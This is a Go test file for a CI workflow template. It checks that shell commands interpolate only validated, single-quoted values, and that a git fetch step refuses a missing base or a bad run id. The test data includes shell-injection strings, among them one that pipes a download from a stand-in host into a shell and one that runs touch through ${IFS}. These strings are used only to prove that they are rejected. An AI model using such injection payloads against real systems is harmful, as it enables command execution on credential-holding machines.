package templates

// The ci.provider reliant ci.yaml runs shell commands built from templates,
// one of them holding the machine's git credentials. These tests pin how a
// value reaches those shells: only from the facts and resolved compute nodes,
// which check every value against a pattern that cannot carry shell syntax,
// and only inside single quotes. They also pin that the pr and queue tiers
// never gate without a base commit.

import (
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"github.com/reliant-labs/forge/pkg/testkit"
)

type reliantCINode struct {
	ID        string            `yaml:"id"`
	Type      string            `yaml:"type"`
	Condition string            `yaml:"condition"`
	Outputs   map[string]string `yaml:"outputs"`
	Args      struct {
		Command     string `yaml:"command"`
		Credentials string `yaml:"credentials"`
	} `yaml:"args"`
}

type reliantCIDoc struct {
	Nodes []reliantCINode `yaml:"nodes"`
	Edges []struct {
		From  string `yaml:"from"`
		Cases []struct {
			Condition string   `yaml:"condition"`
			To        []string `yaml:"to"`
		} `yaml:"cases"`
		Default string `yaml:"default"`
	} `yaml:"edges"`
	Finally struct {
		Sequence []reliantCINode `yaml:"sequence"`
	} `yaml:"finally"`
}

func renderReliantCI(t *testing.T) reliantCIDoc {
	t.Helper()
	out, err := CITemplates("reliant").Render("ci.yaml.tmpl", ReliantCIWorkflowData{Check: "demo/ci"})
	if err != nil {
		t.Fatal(err)
	}
	var doc reliantCIDoc
	if err := yaml.Unmarshal(out, &doc); err != nil {
		t.Fatalf("ci.yaml is not YAML: %v", err)
	}
	return doc
}

func (d reliantCIDoc) node(t *testing.T, id string) reliantCINode {
	t.Helper()
	for _, n := range append(append([]reliantCINode(nil), d.Nodes...), d.Finally.Sequence...) {
		if n.ID == id {
			return n
		}
	}
	t.Fatalf("ci.yaml has no node %q", id)
	return reliantCINode{}
}

var templateAction = regexp.MustCompile(`'?\{\{\s*(.*?)\s*\}\}'?`)

// checkedValues are the node outputs a shell may interpolate: each is
// checked by facts.valid or resolved.ok before any run node can run.
var checkedValues = map[string]bool{
	"nodes.facts.tier": true, "nodes.facts.sha": true, "nodes.facts.base": true,
	"nodes.facts.default_branch": true, "nodes.facts.run": true, "nodes.facts.path": true,
	"nodes.resolved.base": true,
	// finally's cleanup may run when facts did not (a cancel before it).
	"nodes.?facts.run.orValue('')": true, "nodes.?facts.path.orValue('')": true,
}

// Every value a run node's command interpolates is a checked one, inside
// single quotes: never workflow.*, inputs.* or another node's raw output.
func TestReliantCI_ShellsInterpolateOnlyCheckedQuotedValues(t *testing.T) {
	doc := renderReliantCI(t)
	runs := 0
	for _, n := range append(append([]reliantCINode(nil), doc.Nodes...), doc.Finally.Sequence...) {
		if n.Type != "run" {
			continue
		}
		runs++
		for _, m := range templateAction.FindAllStringSubmatch(n.Args.Command, -1) {
			if !checkedValues[m[1]] {
				t.Errorf("run node %s interpolates %q, which no compute node checked", n.ID, m[1])
			}
			if !strings.HasPrefix(m[0], "'") || !strings.HasSuffix(m[0], "'") {
				t.Errorf("run node %s interpolates %s outside single quotes", n.ID, m[0])
			}
		}
	}
	if runs != 3 {
		t.Fatalf("checked %d run nodes, want fetch, gate and cleanup", runs)
	}
	if doc.node(t, "gate").Args.Credentials != "none" || doc.node(t, "cleanup").Args.Credentials != "none" {
		t.Error("gate and cleanup must run with credentials: none")
	}
}

// facts.valid refuses a run id or project path that could break out of the
// single quotes, or otherwise mean something to a shell.
func TestReliantCI_FactsRefuseShellSyntax(t *testing.T) {
	valid := renderReliantCI(t).node(t, "facts").Outputs["valid"]
	pattern := func(field string) *regexp.Regexp {
		m := regexp.MustCompile(regexp.QuoteMeta(field) + `\.matches\('([^']+)'\)`).FindStringSubmatch(valid)
		if m == nil {
			t.Fatalf("facts.valid does not check %s against a pattern:\n%s", field, valid)
		}
		return regexp.MustCompile(m[1]) // RE2, as CEL's matches is
	}
	run, path := pattern("workflow.chat_id"), pattern("workflow.path")
	hostile := []string{"", "a'b", "a;id", "$(id)", "`id`", "a\nb", "a b", "x' && curl evil.sh | sh #", "../x", "a$b"}
	for _, v := range hostile {
		if run.MatchString(v) {
			t.Errorf("a run id %q passes facts.valid", v)
		}
	}
	if !run.MatchString("4b0e7c4e-2f1a-4c4b-9a1e-3f2d1c0b9a8e") {
		t.Error("a UUID run id is refused")
	}
	for _, v := range []string{"relative/dir", "/a'b", "/a\nb", "/$(id)", "/`id`", "/a;b", "/a\"b"} {
		if path.MatchString(v) {
			t.Errorf("a project path %q passes facts.valid", v)
		}
	}
	for _, v := range []string{"/home/workspace/projects/demo", "/Users/me/My Projects/demo"} {
		if !path.MatchString(v) {
			t.Errorf("project path %q is refused", v)
		}
	}
	if !strings.Contains(valid, "workflow.chat_id.matches(") || !strings.Contains(valid, "inputs.tier in [") {
		t.Errorf("facts.valid does not check the run id and the tier:\n%s", valid)
	}
}

// The gate runs only when resolved.ok, which requires a base sha unless the
// tier is main; anything else goes to doc, which reports resolved.error and so
// concludes the check failure.
func TestReliantCI_GateNeedsAResolvedBase(t *testing.T) {
	doc := renderReliantCI(t)
	ok := doc.node(t, "resolved").Outputs["ok"]
	for _, want := range []string{"nodes.fetch.exit_code == 0", "matches('^[0-9a-f]{40}$')", "nodes.facts.tier == 'main'"} {
		if !strings.Contains(ok, want) {
			t.Errorf("resolved.ok lacks %q:\n%s", want, ok)
		}
	}
	routed := false
	for _, e := range doc.Edges {
		switch e.From {
		case "fetch":
			if e.Default != "resolved" || len(e.Cases) != 0 {
				t.Errorf("fetch must go only to resolved, got %+v", e)
			}
		case "resolved":
			routed = len(e.Cases) == 1 && e.Cases[0].Condition == "nodes.resolved.ok == true" &&
				strings.Join(e.Cases[0].To, ",") == "gate" && e.Default == "doc"
		}
	}
	if !routed {
		t.Error("resolved must route to gate only when ok, and to doc otherwise")
	}
	if !strings.Contains(doc.node(t, "doc").Outputs["doc"], "!nodes.resolved.ok") {
		t.Error("doc does not report a run whose base did not resolve")
	}
}

// fetchScript is the fetch node's command as the engine would run it, with
// facts' outputs substituted.
func fetchScript(t *testing.T, facts map[string]string) string {
	cmd := renderReliantCI(t).node(t, "fetch").Args.Command
	return templateAction.ReplaceAllStringFunc(cmd, func(s string) string {
		m := templateAction.FindStringSubmatch(s)
		v, ok := facts[strings.TrimPrefix(m[1], "nodes.facts.")]
		if !ok {
			t.Fatalf("fetch interpolates %s", m[1])
		}
		return "'" + v + "'"
	})
}

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-c", "user.email=t@t", "-c", "user.name=t", "-c", "init.defaultBranch=main"}, args...)...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return strings.TrimSpace(string(out))
}

// The fetch step, run for real against a local origin: the pr and queue
// tiers fail with a clear message when their base does not resolve, main
// needs none, and a run id that is not [A-Za-z0-9-]+ is refused by the shell
// as well (should facts ever let one through).
func TestReliantCI_FetchRefusesAMissingBase(t *testing.T) {
	testkit.Slow(t, "execs git and bash")
	tmp := t.TempDir()
	origin := filepath.Join(tmp, "origin")
	if err := os.MkdirAll(origin, 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, origin, "init", "-q")
	git(t, origin, "commit", "-q", "--allow-empty", "-m", "base")
	base := git(t, origin, "rev-parse", "HEAD")
	git(t, origin, "commit", "-q", "--allow-empty", "-m", "head")
	head := git(t, origin, "rev-parse", "HEAD")
	git(t, origin, "config", "uploadpack.allowAnySHA1InWant", "true")
	checkout := filepath.Join(tmp, "my project")
	git(t, tmp, "clone", "-q", origin, checkout)

	run := func(facts map[string]string) (string, string, int) {
		cmd := exec.Command("bash", "-c", fetchScript(t, facts))
		var stdout, stderr strings.Builder
		cmd.Stdout, cmd.Stderr = &stdout, &stderr
		err := cmd.Run()
		code := 0
		if ee, ok := err.(*exec.ExitError); ok {
			code = ee.ExitCode()
		} else if err != nil {
			t.Fatal(err)
		}
		return strings.TrimSpace(stdout.String()), stderr.String(), code
	}
	facts := func(tier, b, branch, runID string) map[string]string {
		return map[string]string{"tier": tier, "sha": head, "base": b, "default_branch": branch, "run": runID, "path": checkout}
	}
	missing := strings.Repeat("0", 39) + "1"

	if out, errOut, code := run(facts("pr", base, "main", "run-1")); code != 0 || out != base {
		t.Errorf("pr with a base: exit %d, stdout %q (want the base %s)\n%s", code, out, base, errOut)
	}
	// No base given: the default branch's tip (here head) is the base.
	if out, errOut, code := run(facts("pr", "", "main", "run-2")); code != 0 || out != head {
		t.Errorf("pr with no base: exit %d, stdout %q\n%s", code, out, errOut)
	}
	for _, tc := range []struct{ name, tier, base, branch string }{
		{"pr, base not on origin", "pr", missing, "main"},
		{"queue, base not on origin", "queue", missing, "main"},
		{"pr, no base and no default branch", "pr", "", "no-such-branch"},
	} {
		_, errOut, code := run(facts(tc.tier, tc.base, tc.branch, "run-x"))
		if code == 0 || !strings.Contains(errOut, "tier needs") {
			t.Errorf("%s: exit %d, want a failure that says the tier needs its base:\n%s", tc.name, code, errOut)
		}
	}
	if out, errOut, code := run(facts("main", "", "main", "run-3")); code != 0 || out != "" {
		t.Errorf("main with no base: exit %d, stdout %q (want success and no base)\n%s", code, out, errOut)
	}
	if _, errOut, code := run(facts("main", "", "main", "x;touch${IFS}pwned")); code == 0 || !strings.Contains(errOut, "refused: run id") {
		t.Errorf("a hostile run id: exit %d, want refused:\n%s", code, errOut)
	}
	if _, err := os.Stat(filepath.Join(checkout, "pwned")); err == nil {
		t.Error("a hostile run id ran a command")
	}
	if refs := git(t, checkout, "for-each-ref", "--format=%(refname)", "refs/reliant-ci/run-1"); !strings.Contains(refs, "refs/reliant-ci/run-1/head") {
		t.Errorf("fetch did not use the run's private refs: %q", refs)
	}
}
